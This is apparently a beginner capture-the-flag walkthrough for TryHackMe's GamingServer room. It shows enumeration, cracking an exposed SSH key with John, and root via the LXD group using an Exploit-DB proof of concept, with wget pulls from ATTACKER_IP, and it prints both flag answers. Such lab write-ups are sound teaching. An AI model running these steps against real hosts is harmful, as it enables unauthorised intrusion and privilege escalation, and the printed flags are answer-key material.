<img width="320" height="240" alt="image" src="https://github.com/user-attachments/assets/06f9bfdb-b0cf-4421-bc66-01a101c7b96c" />

# Link & Description
https://tryhackme.com/room/gamingserver

An Easy Boot2Root box for beginners

# Walkthrough :
## **First question** : *What is the user flag?*
So let's begging with a regular nmap and gobuster scan and let's see : `nmap -sC -sV VICTIM_IP`

As we can see, we have a SSH service and also a HTTP page so let's do a gobuster scan on it :  `gobuster dir -u VICTIM_IP -w /user/share/wordlists/dirb/common.txt`

[![Capture-d-cran-2025-09-25-085244.png](https://i.postimg.cc/dQmRygGW/Capture-d-cran-2025-09-25-085244.png)](https://postimg.cc/4nyhCLLt)

The Gobuster scan is very interesting, it shows us 2 paths

The first one `/secret` is leading us to `/secret/secretKey` a encrypted RSA key, we save it as ``id_rsa`` and after a `chmod 600 id_rsa` let's crack this one

Next step is `ssh2john id_rsa > rsa.txt` 

And after we give all the work to our dearly friend John : `john rsa.txt --wordlist=/usr/share/wordlists/rockyou.txt`

[![Capture-d-cran-2025-09-25-091826.png](https://i.postimg.cc/8Ph1NQfb/Capture-d-cran-2025-09-25-091826.png)](https://postimg.cc/zVGmFQjL)

OK so we have the passphrase but still not a name for the SSH :/

So let's go back and go on `/uploads` and led us to 3 things

-First a wordlist and after a ctrl + f, our "letmein" is in there, well I think it is not useful anymore

-Second a  *manisfesto.txt* and after a reading I tried to log to the SSH as *Manisfesto, Hacker, Mentor* and nothing...

-Third a *meme.jpg* maybe some stenography is required but it would be for later but let save this for now

WELL well well, let's go on the main page to see something useful

[![Capture-d-cran-2025-09-25-093051.png](https://i.postimg.cc/6QVRv1PV/Capture-d-cran-2025-09-25-093051.png)](https://postimg.cc/HJxVG3dj)

"The House of Danak" of course I tried "danak" and the rest (draagan, droga) for the SSH but still nothing

So let's take a look on the source code with a `ctrl + u` and oooooooooohh what we have here !!

[![Capture-d-cran-2025-09-25-093244.png](https://i.postimg.cc/sxGgpMXF/Capture-d-cran-2025-09-25-093244.png)](https://postimg.cc/sGyzzD7K)

"john, please add some actual content to the site! lorem ipsum is horrible to look at."

So let's try to log on the SSH service with john and let's gooo it works

`ssh john@VICTIM_IP -i id_rsa`

And we have our first flag :)

[![Capture-d-cran-2025-09-25-093711.png](https://i.postimg.cc/L82ZMV5n/Capture-d-cran-2025-09-25-093711.png)](https://postimg.cc/nCSL4BvJ)

*What is the user flag?* : **a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e**
## **Second question** : *What is the root flag?*
OK so let's begging with our path to privilege escalation

Let's go to `/tmp` and upload the lovely one **linpeas.sh**

For that let's start a http server in our machine with the linpeas.sh at the same place : `python3 -m http.server`

Back to our victim machine, we download the file with `wget http://ATTACKER_IP:8000/linpeas.sh .` (And I close the http server)

[![Capture-d-cran-2025-09-25-094557.png](https://i.postimg.cc/htzNcVYR/Capture-d-cran-2025-09-25-094557.png)](https://postimg.cc/4YGW1HZW)

And now we execute linpeas : `sh linpeas.sh` and see the result

And first I will look in the logs

<img width="1303" height="1152" alt="image" src="https://github.com/user-attachments/assets/70526dc7-4ede-4d58-814d-67adb6fd80db" />

And after 30-40min of falling in the rabbit hole in `/var/log` didn't find anything

<img width="1150" height="250" alt="image" src="https://github.com/user-attachments/assets/b4e6a0b9-41ae-40aa-bc7e-ba31f2aef2b4" />

So let's take a step back and see what linpeas tells us and I was too excited and pass the princpal PE vector...

<img width="845" height="66" alt="image" src="https://github.com/user-attachments/assets/9412fc47-c82e-4d59-b84e-9f2052ad1739" />

What is teeling us linpeas : "Yooo, John is a root and lxd group member ". Mmmh too bad, I don't have the John's password. But I don't know what's the lxd thing so go check on the web

After a reserch, I learned that LXD is **a container management tool for the Linux operating system**. I also saw the path to PE with this [thing](https://www.exploit-db.com/exploits/46978)

I'm a good boy and I follow all the inscructions from the POC

**On my machine :**

`wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine`

`bash build-alpine`

`python3 -m http.server`

**On the victim machine :**

`wget http://ATTACKER_IP:8000/alpine-v3.22-x86_64-20250925_1026.tar.gz .`

`nano exploit.py` *And I pasted the POC*

`chmod +x exploit.py`

`./exploit.py -f alpine-v3.22-x86_64-20250925_1026.tar.gz`

And voilaaa

<img width="943" height="346" alt="image" src="https://github.com/user-attachments/assets/19cdb25a-f622-4190-a936-00711729b094" />

Don't rush and make sure to go to `/mnt/root` to see all the file and that's it :)

<img width="1782" height="174" alt="image" src="https://github.com/user-attachments/assets/8f3ad874-0e05-467b-a7c7-01c919561d3c" />

*What is the root flag?* : **2e337b8c9f3aff0c2b3e8d4e6a7c88fc**
